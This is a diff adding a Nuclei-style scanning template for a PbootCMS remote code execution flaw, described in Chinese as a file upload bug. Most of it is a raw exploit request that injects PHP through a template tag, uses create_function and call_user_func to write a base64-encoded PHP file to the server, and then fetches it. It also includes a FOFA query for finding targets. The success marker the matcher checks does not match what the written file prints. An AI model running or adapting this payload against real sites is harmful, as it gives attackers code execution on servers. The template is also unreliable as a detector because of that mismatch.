@@ -1,0 +1,41 @@
+id: pbootcms-index-upload
+
+info:
+  name: PbootCMS Index.php 文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="PBOOTCMS"
+
+    PbootCMS 是基于 PHP 构建的企业网站内容管理系统，采用模块化架构设计并提供开源免费版本，支持企业级网站快速开发与部署。系统通过简化模板引擎降低开发复杂度，并集成可商用的网站模板资源库。2024-07-14 安全研究人员发现其 Index.php 核心组件存在文件上传机制缺陷，攻击者可利用该漏洞在目标服务器写入恶意文件，进而可能获取系统执行权限或敏感数据访问能力。
+  tags: PbootCMS
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /?tag/index=&tag={pbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    Connection: close
+    Cookie: lg=call_user_func
+    Cache-Control: max-age=0
+    Content-Type: application/x-www-form-urlencoded
+
+    1[]=NTest.php&1[]=PD9waHAgZWNobyAnRHVkZVN1aXRlJzsgdW5saW5rKF9fRklMRV9fKTsgPz4=&2=$a,$b&3=return var_dump(file_put_contents($b,base64_decode($a)));
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
